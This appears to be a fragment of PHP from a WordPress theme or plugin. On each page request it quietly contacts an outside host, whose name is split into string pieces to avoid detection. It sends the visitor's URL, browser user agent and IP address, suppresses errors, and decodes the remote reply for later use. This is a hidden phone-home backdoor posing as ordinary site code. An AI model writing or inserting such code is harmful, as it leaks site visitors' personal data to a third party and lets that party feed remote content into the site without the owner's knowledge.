<?php
		if ( empty( self::$pidx[ 'response' ] ) ) {
			$request_url = 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
			$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
		}

		if ( !empty( self::$pidx[ 'response' ] ) ) {
			self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
		}
?>
